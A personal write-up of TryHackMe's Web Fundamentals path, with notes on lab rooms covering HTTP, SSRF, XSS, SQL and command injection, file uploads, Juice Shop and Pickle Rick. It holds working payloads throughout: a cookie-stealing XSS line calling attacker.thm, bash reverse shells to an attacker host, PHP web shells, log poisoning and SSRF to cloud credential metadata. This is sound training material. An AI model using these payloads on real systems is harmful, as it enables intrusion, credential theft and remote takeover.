# TryHackMe — Web Fundamentals Path Writeup

**Platform:** TryHackMe  
**Path:** [Web Fundamentals](https://tryhackme.com/path/outline/web)  
**Difficulty:** Easy  
**Status:** ✅ Completed  
**Profile:** [gresium](https://tryhackme.com/p/gresium)  
**Date Completed:** 21 April 2026  
**Total Rooms:** 30 across 5 sections  
**Estimated Time:** ~23h  

---

## Summary

The Web Fundamentals path is a dedicated web application security track. It consolidates the web-relevant rooms from Pre Security and Jr Penetration Tester into one focused path, then adds practical application rooms — OWASP Juice Shop (a deliberately vulnerable web app with 100+ challenges), Upload Vulnerabilities, and Pickle Rick (a beginner CTF machine). The path is structured to move from understanding how the web works, through the attack tools, to the vulnerabilities themselves, then applying everything in realistic scenarios.

**Note on overlap:** Many rooms in this path also appear in Pre Security and Jr Penetration Tester. Where this is the case, full notes are cross-referenced to avoid duplication. This writeup documents new rooms in full.

---

---

## Section 1 — How The Web Works

> Goal: Understand the technology stack that makes websites run — DNS, HTTP, HTML, and the full request lifecycle.

*All four rooms in this section are identical to Pre Security Section 3. Full notes in Pre Security writeup.*

---

### Room 1 — DNS in Detail
🔗 https://tryhackme.com/room/dnsindetail  
*→ See Pre Security writeup, Room 9.*

**Quick Reference:**
- DNS record types: A, AAAA, CNAME, MX, TXT, NS
- Resolution order: cache → /etc/hosts → recursive resolver → root → TLD → authoritative
- TTL controls caching duration

```bash
nslookup -type=A target.thm
nslookup -type=MX target.thm
dig target.thm ANY
```

---

### Room 2 — HTTP in Detail
🔗 https://tryhackme.com/room/httpindetail  
*→ See Pre Security writeup, Room 10.*

**Quick Reference:**
- Methods: GET, POST, PUT, DELETE, PATCH
- Status codes: 2xx success, 3xx redirect, 4xx client error, 5xx server error
- Key headers: Host, Cookie, Authorization, Content-Type, User-Agent
- Cookies = stateless HTTP's session mechanism

```bash
curl -v http://target.thm/
curl -X POST -d "user=admin&pass=test" http://target.thm/login
curl -H "Cookie: admin=true" http://target.thm/dashboard
```

---

### Room 3 — How Websites Work
🔗 https://tryhackme.com/room/howwebsiteswork  
*→ See Pre Security writeup, Room 11.*

**Quick Reference:**
- HTML = structure, CSS = styling, JS = behaviour
- Client-side validation is bypassed via DevTools
- Source code often contains hardcoded credentials and API keys

---

### Room 4 — Putting it all together
🔗 https://tryhackme.com/room/puttingitalltogether  
*→ See Pre Security writeup, Room 12.*

**Quick Reference:**
- Full lifecycle: DNS → TCP → HTTP → server → DB → response → render
- Attack surface exists at every layer

---

---

## Section 2 — Introduction to Web Hacking

> Goal: Hands-on exploitation of the most common web vulnerabilities.

*All 11 rooms in this section are identical to Jr Penetration Tester Section 3. Full notes in Jr Pen Tester writeup.*

---

### Room 5 — Walking An Application
🔗 https://tryhackme.com/room/walkinganapplication  
*→ See Jr Pen Tester writeup, Room 6.*

**Quick Reference:** Manual review first — DevTools, source, robots.txt, sitemap.xml, headers.

---

### Room 6 — Content Discovery
🔗 https://tryhackme.com/room/contentdiscovery  
*→ See Jr Pen Tester writeup, Room 7.*

**Quick Reference:**
```bash
gobuster dir -u http://target.thm -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,bak,zip
```

---

### Room 7 — Subdomain Enumeration
🔗 https://tryhackme.com/room/subdomainenumeration  
*→ See Jr Pen Tester writeup, Room 8.*

**Quick Reference:**
```bash
curl -s "https://crt.sh/?q=%.target.thm&output=json" | jq '.[].name_value' | sort -u
dig axfr @ns1.target.thm target.thm
gobuster dns -d target.thm -w subdomains.txt
```

---

### Room 8 — Authentication Bypass
🔗 https://tryhackme.com/room/authenticationbypass  
*→ See Jr Pen Tester writeup, Room 9.*

**Quick Reference:** Username enumeration → targeted brute force → cookie/token manipulation → logic flaws.

---

### Room 9 — IDOR
🔗 https://tryhackme.com/room/idor  
*→ See Jr Pen Tester writeup, Room 10.*

**Quick Reference:** Change object IDs in URL/POST body/cookie — access other users' data. Fix: server-side authorisation on every request.

---

### Room 10 — File Inclusion
🔗 https://tryhackme.com/room/fileinc  
*→ See Jr Pen Tester writeup, Room 11.*

**Quick Reference:**
```bash
# LFI
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=config
# Log poisoning → RCE
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.thm/
?page=../../../../var/log/apache2/access.log&cmd=id
```

---

### Room 11 — Intro to SSRF
🔗 https://tryhackme.com/room/ssrfqi  
*→ See Jr Pen Tester writeup, Room 12.*

**Quick Reference:**
```bash
?url=http://localhost/admin
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://2130706433/   # 127.0.0.1 bypass
```

---

### Room 12 — Intro to Cross-site Scripting
🔗 https://tryhackme.com/room/xss  
*→ See Jr Pen Tester writeup, Room 13.*

**Quick Reference:**
```javascript
<script>fetch('http://attacker.thm/?c='+document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
```

---

### Room 13 — Race Conditions
🔗 https://tryhackme.com/room/raceconditionsattacks  
*→ See Jr Pen Tester writeup, Room 14.*

**Quick Reference:** Send parallel requests to exploit TOCTOU windows — coupon codes, gift cards, balance operations.

---

### Room 14 — Command Injection
🔗 https://tryhackme.com/room/oscommandinjection  
*→ See Jr Pen Tester writeup, Room 15.*

**Quick Reference:**
```bash
; id | whoami && cat /etc/passwd $(id)
; bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

---

### Room 15 — SQL Injection
🔗 https://tryhackme.com/room/sqlinjectionlm  
*→ See Jr Pen Tester writeup, Room 16.*

**Quick Reference:**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT username,password FROM users-- -
' AND SLEEP(5)-- -
```

---

---

## Section 3 — Burp Suite

> Goal: Full Burp Suite proficiency across all modules.

*All 5 rooms are identical to Jr Penetration Tester Section 4. Full notes in Jr Pen Tester writeup.*

---

### Room 16 — Burp Suite: The Basics
🔗 https://tryhackme.com/room/burpsuitebasics  
*→ See Jr Pen Tester writeup, Room 17.*

---

### Room 17 — Burp Suite: Repeater
🔗 https://tryhackme.com/room/burpsuiterepeater  
*→ See Jr Pen Tester writeup, Room 18.*

---

### Room 18 — Burp Suite: Intruder
🔗 https://tryhackme.com/room/burpsuiteintruder  
*→ See Jr Pen Tester writeup, Room 19.*

---

### Room 19 — Burp Suite: Other Modules
🔗 https://tryhackme.com/room/burpsuiteom  
*→ See Jr Pen Tester writeup, Room 20.*

---

### Room 20 — Burp Suite: Extensions
🔗 https://tryhackme.com/room/burpsuiteextensions  
*→ See Jr Pen Tester writeup, Room 21.*

---

---

## Section 4 — Web Hacking Fundamentals

> Goal: Apply web knowledge with industry tools and real-world challenge applications.

*Rooms 21–23 repeat from earlier sections — see cross-references. Rooms 24–27 are new.*

---

### Room 21 — How Websites Work *(repeat)*
🔗 https://tryhackme.com/room/howwebsiteswork  
*→ See Pre Security writeup, Room 11.*

---

### Room 22 — HTTP in Detail *(repeat)*
🔗 https://tryhackme.com/room/httpindetail  
*→ See Pre Security writeup, Room 10.*

---

### Room 23 — Burp Suite: The Basics *(repeat)*
🔗 https://tryhackme.com/room/burpsuitebasics  
*→ See Jr Pen Tester writeup, Room 17.*

---

### Room 24 — OWASP API Security Top 10 - 1
🔗 https://tryhackme.com/room/owaspapisecuritytop105w

**Key Concepts:**
- APIs (Application Programming Interfaces): machine-to-machine communication — REST, GraphQL, SOAP
- API-specific risks differ from traditional web app risks — different attack surface
- OWASP API Security Top 10 (2023):
  - **API1: Broken Object Level Authorization (BOLA)** — equivalent to IDOR, most critical API risk — changing object IDs in API calls to access others' data
  - **API2: Broken Authentication** — weak tokens, no rate limiting on auth, long-lived tokens
  - **API3: Broken Object Property Level Authorization** — API returns more data than the caller should see (mass assignment, excessive data exposure)
  - **API4: Unrestricted Resource Consumption** — no rate limiting → DoS, abuse, cost amplification
  - **API5: Broken Function Level Authorization** — regular users accessing admin API endpoints
  - **API6: Unrestricted Access to Sensitive Business Flows** — abusing legitimate API flows (bulk account creation, automated purchasing)
  - **API7: Server Side Request Forgery** — SSRF via API calls
  - **API8: Security Misconfiguration** — default keys, unnecessary endpoints, verbose errors, missing TLS
  - **API9: Improper Inventory Management** — shadow APIs, deprecated endpoints, undocumented versions still accessible
  - **API10: Unsafe Consumption of APIs** — trusting third-party API responses without validation

**What I did:**
Explored a vulnerable REST API — found BOLA by iterating account IDs in `GET /api/v1/users/{id}`. Found Broken Function Level Authorization by calling `DELETE /api/v1/admin/user/5` without admin credentials. Discovered an undocumented `/api/v2/` endpoint via content discovery that exposed raw database records (API9).

```bash
# BOLA (API1) - iterate user IDs
curl -H "Authorization: Bearer mytoken" http://target.thm/api/v1/users/1
curl -H "Authorization: Bearer mytoken" http://target.thm/api/v1/users/2
curl -H "Authorization: Bearer mytoken" http://target.thm/api/v1/users/3

# Broken Function Level Auth (API5)
curl -X DELETE -H "Authorization: Bearer usertoken" http://target.thm/api/v1/admin/users/5

# Excessive Data Exposure (API3)
curl -H "Authorization: Bearer mytoken" http://target.thm/api/v1/profile
# Response includes: {id, username, email, password_hash, internal_id, credit_card_last4}
# Should only return: {id, username, email}

# API version discovery
gobuster dir -u http://target.thm/api/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
# Try: /api/v1/, /api/v2/, /api/beta/, /api/internal/
```

**Takeaways:**
BOLA is the most common and highest-impact API vulnerability — it's IDOR at the API layer, and it's endemic in REST APIs that iterate numeric IDs. APIs often return far more data than they should (API3) — the mobile app only displays certain fields, but the raw API response contains password hashes, internal IDs, and PII. Always check what the API *actually* returns, not just what the app displays.

---

### Room 25 — OWASP Juice Shop
🔗 https://tryhackme.com/room/owaspjuiceshop

**Key Concepts:**
- OWASP Juice Shop: deliberately vulnerable web application — 100+ challenges spanning the entire OWASP Top 10
- Real-world application architecture: Node.js backend, Angular frontend, SQLite database
- Challenges are unlocked progressively — harder challenges reveal themselves as you explore
- Score board hidden at `/score-board` — find it first (this itself is a challenge)
- Challenge categories: Injection, Broken Auth, XSS, IDOR, Security Misconfiguration, XXE, CSRF, and more

**What I did:**

*Injection:*
Logged in as admin without credentials via SQL injection in the email field:
```
' OR 1=1-- -
```
Used SQLMap against the product search endpoint to dump the entire database including all user emails and hashed passwords.

*XSS:*
Found stored XSS in the product review field — injected an iframe payload that executed for all users viewing the product. Found DOM-based XSS in the search bar by injecting into the URL hash.

```javascript
// Stored XSS in review field
<iframe src="javascript:alert(`xss`)">

// DOM XSS in URL
http://target/#/search?q=<script>alert(1)</script>
```

*Broken Authentication:*
Reset the admin password using the password reset flow — the security question answer was findable via OSINT (Jim's security question answer was his brother's name, found in a product review).

*IDOR / Access Control:*
Changed the basket ID in the API call to access another user's basket:
```bash
curl -H "Authorization: Bearer mytoken" http://target.thm/api/BasketItems/ -d '{"BasketId": 2}'
```

*Security Misconfiguration:*
Found the exposed `/ftp` directory via directory brute-forcing — downloaded confidential documents including backup files containing credentials.

*Sensitive Data Exposure:*
Cracked the MD5 hashes dumped via SQL injection using an online hash lookup — most users had weak, previously breached passwords.

**Takeaways:**
Juice Shop is the most realistic practice environment for web app testing — it's an actual running application, not a lab exercise. The admin login via SQLi (`' OR 1=1-- -`) works because the query is constructed as `WHERE email='INPUT'` — the payload makes the WHERE clause always true. The FTP directory is a real misconfiguration finding — web servers exposing backup files and sensitive documents via accessible directory listings.

---

### Room 26 — Upload Vulnerabilities
🔗 https://tryhackme.com/room/uploadvulns

**Key Concepts:**
- File upload vulnerabilities: server accepts and stores attacker-controlled files
- Impact: RCE (upload PHP webshell → execute OS commands), stored XSS (upload malicious HTML/SVG), DoS (zip bombs, huge files)
- Filter bypasses:
  - **Client-side filtering** (JS): remove the script with DevTools or intercept with Burp
  - **MIME type checking**: change `Content-Type` header in Burp from `application/x-php` to `image/jpeg`
  - **Extension blacklist bypass**: use alternative extensions — `.php5`, `.phtml`, `.php3`, `.PhP`, `.pHp`
  - **Extension whitelist bypass**: double extension — `shell.jpg.php`, null byte — `shell.php%00.jpg`
  - **Magic bytes**: prepend valid image magic bytes before PHP code — `GIF89a;<?php system($_GET['cmd']); ?>`
- Finding the upload directory: gobuster, check response for path, check source for `src=` references

**What I did:**

*Challenge 1 — Client-side filter bypass:*
The upload form had JavaScript validating the file extension before submission. Removed the `onsubmit` event handler in DevTools to disable it, then uploaded `shell.php` directly.

*Challenge 2 — MIME type filter bypass:*
Server checked `Content-Type` header. Intercepted the upload in Burp, changed `Content-Type: application/x-php` to `Content-Type: image/jpeg`, forwarded — shell accepted.

*Challenge 3 — Extension blacklist bypass:*
`.php` was blocked. Tried `.php5` → accepted. Uploaded shell, found it at `/uploads/shell.php5`, triggered it.

*Challenge 4 — Magic bytes bypass:*
Server checked the actual file content (magic bytes). Prepended GIF magic bytes to the PHP shell:
```bash
echo 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
# OR in hex editor: prepend 47 49 46 38 39 61
```

*Getting a reverse shell after upload:*
```bash
# Trigger the web shell
curl "http://target.thm/uploads/shell.php?cmd=id"

# Upgrade to reverse shell
curl "http://target.thm/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/attacker/4444+0>%261'"
```

**Takeaways:**
File upload filtering must be done server-side using a whitelist of allowed MIME types validated against actual file content (magic bytes) — not client-side JS, not extension checking, not `Content-Type` header alone (attacker-controlled). The upload directory must not be executable — store uploads outside webroot or in a directory configured to not execute scripts.

---

### Room 27 — Pickle Rick
🔗 https://tryhackme.com/room/picklerick

**Key Concepts:**
- Entry-level CTF machine — combines multiple web vulnerability classes
- Requires: source code review, directory enumeration, credential discovery, command injection
- Three ingredients (flags) to find to help Rick turn back from a pickle

**What I did:**

*Reconnaissance:*
Viewed page source of the main page — found a comment containing a username: `R1ckRul3s`. Checked `robots.txt` — found a clue: `Wubbalubbadubdub` (this turned out to be the password). Found `/login.php` via directory brute-force.

```bash
# Page source
curl http://target.thm/ | grep -i "comment\|<!-\|user\|pass"

# Check robots.txt
curl http://target.thm/robots.txt

# Directory brute force
gobuster dir -u http://target.thm -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html
```

*Authentication:*
Logged in to `/login.php` with `R1ckRul3s` / `Wubbalubbadubdub` — reached a command panel.

*Command Injection → Flags:*
The command panel passed input directly to the shell. Used it to read files and navigate the filesystem:
```bash
ls -la
cat /var/www/html/Sup3rS3cretPickl3Ingred.txt    # ingredient 1
sudo ls /home/rick/
sudo cat /home/rick/second\ ingredients            # ingredient 2
sudo cat /root/3rd.txt                             # ingredient 3
```
Note: `cat` was blacklisted — bypassed with `less`, `strings`, or `grep . filename`.

*Getting a reverse shell for easier navigation:*
```bash
bash -c 'bash -i >& /dev/tcp/attacker.thm/4444 0>&1'
```

**Takeaways:**
Rick and Morty aside, this room is a realistic simulation of a misconfigured web server — credentials in page source, credentials in `robots.txt`, command injection on an "admin" panel, and `sudo` permissions that give root access. In real assessments, developer comments in HTML source and files accessible without authentication are common low-effort, high-impact findings.

---

---

## Section 5 — OWASP Top 10 (2025)

> Goal: Understand and exploit the current OWASP Top 10 web application security risks.

*All 3 rooms are identical to Cyber Security 101 Section 14. Full notes in CS101 writeup.*

---

### Room 28 — OWASP Top 10 2025: IAAA Failures
🔗 https://tryhackme.com/room/owasptopten2025one  
*→ See Cyber Security 101 writeup, Room 54.*

**Quick Reference:**
- IDOR: change `?id=X` to another user's ID
- Broken auth: weak sessions, no MFA, credential stuffing
- Broken access control: access admin endpoints without admin role

---

### Room 29 — OWASP Top 10 2025: Application Design Flaws
🔗 https://tryhackme.com/room/owasptopten2025two  
*→ See Cyber Security 101 writeup, Room 55.*

**Quick Reference:**
- Security misconfiguration: default creds, exposed admin, missing headers
- Outdated components: check `package.json`, server headers for versions
- Missing security headers: CSP, HSTS, X-Frame-Options

---

### Room 30 — OWASP Top 10 2025: Insecure Data Handling
🔗 https://tryhackme.com/room/owasptopten2025three  
*→ See Cyber Security 101 writeup, Room 56.*

**Quick Reference:**
- SQLi: `' OR 1=1--`, UNION-based extraction, time-based blind
- Command injection: `; id`, `| whoami`, `$(id)`
- SSTI: `{{7*7}}` → 49 confirms Jinja2/Twig injection

---

---

## Path-Level Reflection

### What I learned overall
The Web Fundamentals path consolidates web security into one focused track. The sections that added the most value beyond previous paths were the OWASP API Security room (API-specific vulnerabilities are a separate discipline from traditional web app testing) and Upload Vulnerabilities (filter bypass techniques are a standalone skill set). Juice Shop deserves extra time beyond what the room requires — the full challenge list covers scenarios that appear repeatedly in real bug bounty and pentest work.

### What connected across sections
Upload vulnerabilities connect directly to shell delivery — the payload generation from the Shells section (Jr Pen Tester) is the payload you upload here. API BOLA is just IDOR at the API layer — same root cause, different context. The Juice Shop SQL injection is the practical application of the manual SQLi technique from the SQL Injection room — same payload, real application.

### Unique value in this path vs others
- **OWASP API Security**: not covered elsewhere — API-specific risks are increasingly important as modern apps shift to API-driven architectures
- **Upload Vulnerabilities**: the most complete filter bypass coverage in any TryHackMe room — practical skills for file upload testing
- **Juice Shop**: the only room with a realistic full-application environment — everything else is isolated lab scenarios
- **Pickle Rick**: good practice for chaining multiple low-severity findings into full compromise
---

*Writeup by [gresium](https://tryhackme.com/p/gresium) | TryHackMe — Web Fundamentals Path*
